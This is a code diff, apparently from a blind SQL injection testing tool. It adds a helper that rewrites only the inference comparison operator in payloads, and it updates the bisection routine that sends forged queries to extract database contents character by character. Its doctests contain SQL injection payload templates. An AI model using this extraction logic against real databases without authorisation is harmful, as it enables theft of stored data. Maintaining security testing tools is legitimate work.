@@ -109,6 +109,19 @@ def normalizedExpression(expression):
 
     return retVal
 
+def replaceInferenceOperator(payload, replacement):
+    """
+    Replaces only the inference comparison operator (i.e. the one right in front of the compared
+    value placeholder), leaving any other occurrence (e.g. inside the original parameter value) intact
+
+    >>> replaceInferenceOperator("1FF>6182 AND ASCII(SUBSTRING((%s),%d,1))>%d", "!=")
+    '1FF>6182 AND ASCII(SUBSTRING((%s),%d,1))!=%d'
+    >>> replaceInferenceOperator("a>b AND SUBSTR((%s),%d,1)>'%c'", "=")
+    "a>b AND SUBSTR((%s),%d,1)='%c'"
+    """
+
+    return re.sub(r"%s(?=%%d|'%%c')" % re.escape(INFERENCE_GREATER_CHAR), lambda match: replacement, payload)
+
 def getHuffmanPrior(order, scale, dbms=None):
     """
     Character-level order-N Markov model {context: {ordinal: count}} used to warm the Huffman
@@ -350,7 +363,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
     elif Backend.isDbms(DBMS.FRONTBASE):
         match = re.search(r"\ASELECT\b(\s+TOP\s*\([^)]+\)\s+)?(.+)\bFROM\b(.+)\Z", expression, re.I)
         if match:
-            payload = payload.replace(INFERENCE_GREATER_CHAR, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
+            payload = replaceInferenceOperator(payload, " FROM %s)%s" % (match.group(3).strip(), INFERENCE_GREATER_CHAR))
             payload = payload.replace("SUBSTRING", "(SELECT%sSUBSTRING" % (match.group(1) if match.group(1) else " "), 1)
             expression = match.group(2).strip()
 
@@ -509,9 +522,9 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
                 markingValue = "'%s'" % CHAR_INFERENCE_MARK
                 unescapedCharValue = unescaper.escape("'%s'" % decodeIntToUnicode(posValue))
-                forgedPayload = agent.extractPayload(payload) or ""
+                forgedPayload = replaceInferenceOperator(agent.extractPayload(payload) or "", INFERENCE_EQUALS_CHAR)
                 forgedPayload = forgedPayload.replace(markingValue, unescapedCharValue)
-                forgedPayload = safeStringFormat(forgedPayload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, posValue))
+                forgedPayload = safeStringFormat(forgedPayload, (expressionUnescaped, idx, posValue))
                 result = Request.queryPage(agent.replacePayload(payload, forgedPayload), timeBasedCompare=timeBasedCompare, raise404=False)
                 incrementCounter(getTechnique())
 
@@ -530,7 +543,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
 
             threadData = getCurrentThreadData()
 
-            validationPayload = re.sub(r"(%s.*?)%s(.*?%s)" % (PAYLOAD_DELIMITER, INFERENCE_GREATER_CHAR, PAYLOAD_DELIMITER), r"\g<1>%s\g<2>" % INFERENCE_NOT_EQUALS_CHAR, payload)
+            validationPayload = replaceInferenceOperator(payload, INFERENCE_NOT_EQUALS_CHAR) if PAYLOAD_DELIMITER in payload else payload
 
             if "'%s'" % CHAR_INFERENCE_MARK not in payload:
                 forgedPayload = safeStringFormat(validationPayload, (expressionUnescaped, idx, value))
@@ -668,7 +681,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
             # If it disagrees, the IN() channel is unreliable here: latch the technique off so the
             # classic '>' bisection takes over for the rest of the run (graceful fallback).
             if not kb.huffmanValidated:
-                verifyPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, value))
+                verifyPayload = safeStringFormat(replaceInferenceOperator(payload, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, value))
                 verified = Request.queryPage(verifyPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                 incrementCounter(getTechnique())
                 if verified:
@@ -739,7 +752,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                 return None
 
             elif len(charTbl) == 1:
-                forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
+                forgedPayload = safeStringFormat(replaceInferenceOperator(payload, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, charTbl[0]))
                 result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                 incrementCounter(getTechnique())
 
@@ -963,7 +976,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                     choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]
                     mask = 1 << choice
 
-                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
+                    forgedPayload = safeStringFormat(replaceInferenceOperator(payload, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                     result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                     incrementCounter(getTechnique())
 
@@ -975,7 +988,7 @@ def bisection(payload, expression, length=None, charsetType=None, firstChar=None
                     bit += 1
 
                 if candidates:
-                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
+                    forgedPayload = safeStringFormat(replaceInferenceOperator(payload, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                     result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                     incrementCounter(getTechnique())
 
